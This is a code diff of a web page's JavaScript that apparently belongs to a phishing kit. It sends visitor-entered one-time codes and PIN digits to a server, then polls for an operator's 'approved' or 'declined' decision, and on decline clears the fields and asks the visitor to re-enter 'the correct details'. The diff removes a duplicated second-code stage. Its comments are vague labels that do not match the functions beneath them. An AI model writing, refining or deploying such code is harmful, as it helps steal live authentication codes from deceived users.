@@ -560,90 +560,44 @@ async function sendStagePayload(stage, payload) {
 }
 
 // Polling core infrastructure engine
-async function submitCode2Stage(code2Value) {
-  userData.code2 = code2Value;
-  document.getElementById("code2Waiting").classList.remove("hidden");
-
-  const success = await sendStagePayload("code2", { code2: userData.code2 });
-  if (success) {
-    startPolling("code2", "page4", "page5", "code2Waiting", "code2Message");
-  }
-}
-
-// Pipeline transmission communications helper
-async function submitCode2Stage(code2Value) {
-  userData.code2 = code2Value;
-  document.getElementById("code2Waiting").classList.remove("hidden");
-
-  const success = await sendStagePayload("code2", { code2: userData.code2 });
-  if (success) {
-    startPolling("code2", "page4", "page5", "code2Waiting", "code2Message");
-  }
-}
-
-// Pipeline transmission communications helper
-async function sendStagePayload(stage, payload) {
-  try {
-    const response = await fetch("/api/approval-request", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ sessionId, stage, payload })
-    });
-    return response.ok;
-  } catch (e) {
-    return false;
-  }
-}
-
-// Polling core infrastructure engine
 function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, successCallback) {
   const msgElement = document.getElementById(msgId);
-  if (msgElement) {
-    msgElement.className = "status";
-    msgElement.innerText = "";
-  }
+  msgElement.className = "status";
+  msgElement.innerText = "";
 
-  if (window.pollingInterval) clearInterval(window.pollingInterval);
+  if(pollingInterval) clearInterval(pollingInterval);
 
-  window.pollingInterval = setInterval(async () => {
+  pollingInterval = setInterval(async () => {
     try {
       const res = await fetch(`/api/status?sessionId=${sessionId}&stage=${stage}`);
       const data = await res.json();
 
       if (data.status === "approved") {
-        // Explicitly clear interval first to stop the engine completely on success
-        clearInterval(window.pollingInterval);
-        window.pollingInterval = null;
-        
-        // Unhide elements instantly for the first submission jump
+        clearInterval(pollingInterval);
         document.getElementById(spinnerId).classList.add("hidden");
         document.getElementById(currentPageId).classList.add("hidden");
         document.getElementById(nextPageId).classList.remove("hidden");
-        
         if (successCallback) successCallback();
-      } else if (data.status === "declined") {
-        // Stop polling so the user can fix their input details
-        clearInterval(window.pollingInterval);
-        window.pollingInterval = null;
+           } else if (data.status === "declined") {
+        clearInterval(pollingInterval);
         
-        // 1. Hide the waiting spinner overlay screen
+        // 1. Hide the full-page waiting spinner overlay screen
         document.getElementById(spinnerId).classList.add("hidden");
         
         // 2. Clear out old entries from the text box and individual PIN grids
-        const code2Input = document.getElementById('code2');
-        if (code2Input) code2Input.value = '';
-        
         const otpInput = document.getElementById('code1');
         if (otpInput) otpInput.value = '';
         
         const pinBoxes = document.querySelectorAll('.boxes input');
         pinBoxes.forEach(box => box.value = '');
         
-        // 3. Alert user about the correction step without blocking the interface view
-        if (msgElement) {
-          msgElement.className = "error";
-          msgElement.innerText = "Incorrect entry. Please enter the correct details.";
-        }
+        // 3. Reset the primary continue button back to its initial locked style state
+        const submitBtn = document.getElementById('submitCode1');
+        if (submitBtn) submitBtn.disabled = true;
+
+        // 4. Alert user about the correction step without blocking the interface view
+        msgElement.className = "error";
+        msgElement.innerText = "Incorrect entry. Please enter the correct details.";
       }
  
     } catch (err) {
@@ -651,3 +605,4 @@ function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, succes
     }
   }, 2500);
 }
+</script>
